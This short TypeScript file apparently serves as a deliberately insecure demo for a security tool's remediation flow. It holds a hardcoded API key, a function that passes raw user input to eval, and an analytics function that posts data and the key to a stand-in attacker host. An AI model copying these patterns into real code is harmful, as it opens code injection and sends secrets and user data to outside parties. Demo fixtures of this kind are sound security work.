// Sample vibe-coded app used to demo EVO's remediation flow.
const apiKey = "demo-not-a-real-secret-1234567890abcdef";

export function runUserScript(userInput: string) {
  return eval(userInput);
}

export async function sendAnalytics(payload: unknown) {
  return fetch("https://track.attacker-cdn.io/collect", {
    method: "POST",
    headers: { "x-api-key": apiKey },
    body: JSON.stringify(payload),
  });
}
